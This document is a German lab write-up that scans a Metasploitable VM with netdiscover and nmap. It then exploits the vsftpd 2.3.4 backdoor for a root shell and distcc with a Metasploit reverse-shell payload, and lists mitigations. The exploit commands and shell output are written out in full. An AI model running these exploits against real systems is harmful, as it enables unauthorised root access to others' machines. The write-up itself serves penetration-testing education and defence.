# Auftrag Enumeration / Fingerprinting
## Systems used
- Kali Linux
```bash
┌──(root㉿kali)-[~]
└─# cat /etc/os-release 
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2025.2"
VERSION="2025.2"
VERSION_CODENAME=kali-rolling
ID=kali
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"
ANSI_COLOR="1;31"                     
```
- Metasploitable

## TCP & UDP-Scan
### Netdiscover
IP der Metasploitable finden mit Netdiscover und danach die gefunden IPs mit nmap scannen um zu finden welches die Metasploitable ist:
```bash
Currently scanning: 172.16.21.0/16   |   Screen View: Unique Hosts                                                                                            
                                                                                                                                                               
 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300                                                                                               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.122.1   00:50:56:c0:00:01      1      60  VMware, Inc.                                                                                                
 192.168.172.1   00:50:56:c0:00:01      1      60  VMware, Inc.                                                                                                
 192.168.172.129 00:0c:29:67:61:51      1      60  VMware, Inc.                                                                                                
 192.168.172.254 00:50:56:e7:0f:50      1      60  VMware, Inc.                                                                                                
 192.168.238.1   00:50:56:c0:00:01      1      60  VMware, Inc.    
```

### TCP-Scan
```bash
┌──(root㉿kali)-[~]
└─# nmap -sS -sV -O 192.168.172.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 09:46 CEST
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:03 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 39.13% done; ETC: 09:46 (0:00:08 remaining)
Nmap scan report for 192.168.172.129
Host is up (0.00036s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login?
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:0C:29:67:61:51 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.64 seconds
```

### UDP-Scan
```bash
                                                                                                                                                                
┌──(root㉿kali)-[~]
└─# nmap -sU 192.168.172.129    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 09:59 CEST
Stats: 0:01:30 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.18% done; ETC: 10:14 (0:13:14 remaining)
Stats: 0:01:31 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.28% done; ETC: 10:14 (0:13:14 remaining)
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.38% done; ETC: 10:14 (0:13:14 remaining)
Stats: 0:01:33 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.48% done; ETC: 10:14 (0:13:14 remaining)
Stats: 0:01:34 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.58% done; ETC: 10:14 (0:13:14 remaining)
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.68% done; ETC: 10:14 (0:13:15 remaining)
Stats: 0:01:36 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.78% done; ETC: 10:14 (0:13:15 remaining)
Stats: 0:01:37 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 10.88% done; ETC: 10:14 (0:13:15 remaining)
Stats: 0:01:40 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 11.18% done; ETC: 10:14 (0:13:14 remaining)
Stats: 0:01:41 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 11.28% done; ETC: 10:14 (0:13:14 remaining)
Stats: 0:01:42 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 11.38% done; ETC: 10:14 (0:13:14 remaining)
```
Anhand dieses outputs, stelle ich fest, dass die Metasploitable keine offenen UDP ports hat. Wie auch im oberen Code-Snippet gezeigt sind nur TCP-Ports sichtbar.

## Exploit
### Open vstfpd Backdoor
```bash
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.172.129
RHOSTS => 192.168.172.129
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 192.168.172.129:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.172.129:21 - USER: 331 Please specify the password.
[+] 192.168.172.129:21 - Backdoor service has been spawned, handling...
[+] 192.168.172.129:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.172.128:37113 -> 192.168.172.129:6200) at 2025-09-02 10:41:55 +0200

whoami
root
pwd
/
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```
Port 6200 now open
```bash
──(root㉿kali)-[~]
└─# nmap -p 6200 192.168.172.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 10:22 CEST
Nmap scan report for 192.168.172.129
Host is up (0.00072s latency).

PORT     STATE SERVICE
6200/tcp open  lm-x
MAC Address: 00:0C:29:67:61:51 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.77 seconds
```
### Massnahmen
- Software aktualisieren
- FTP-Dienst deaktivieren wenn nicht benötigt
- Wenn benötigt auf STFP oder FTPS wechseln
- Firewall Rules machen

### DistCC
Alter Distributed Compiler Service welcher vulnerable ist.

```bash
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 192.168.172.129
RHOSTS => 192.168.172.129
msf6 exploit(unix/misc/distcc_exec) > set LHOST 192.168.172.128
LHOST => 192.168.172.128
msf6 exploit(unix/misc/distcc_exec) > set LPORT 4444
LPORT => 4444
msf6 exploit(unix/misc/distcc_exec) > run
[*] Started reverse TCP double handler on 192.168.172.128:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo ZPaHI3JGq698IGuI;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "ZPaHI3JGq698IGuI\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (192.168.172.128:4444 -> 192.168.172.129:40309) at 2025-09-02 10:48:48 +0200

whoami
daemon
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

### Massnahmen
- Dienst deaktivieren
- Firewall/ACLs einsetzen
- Aktualisieren
